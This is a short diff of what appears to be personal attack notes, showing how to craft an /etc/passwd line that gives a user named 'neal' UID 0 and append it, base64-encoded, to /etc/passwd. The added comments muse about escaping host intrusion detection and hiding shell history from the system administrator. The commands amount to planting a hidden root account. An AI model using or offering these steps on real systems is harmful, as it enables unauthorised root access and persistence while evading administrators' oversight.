@@ -47,7 +47,10 @@ openssl passwd -1
 neal:yourgeneratedstring:0:0:neal:/root/bin/bash
 
 # write to passwd, save the above string to a file passwd
-cat passwd | base64 -w 0   # I don't know why base64, base64 comes nothing.
+# I don't understand why base64, base64 comes nothing. 
+# I don't know if it can escape from the HIDS.
+# Seems it just want to hide the bash_hisrtory from the system admin but it must be stupid.
+cat passwd | base64 -w 0   
 
 echo generated_base64 | base64 -d >> /etc/passwd
 ```
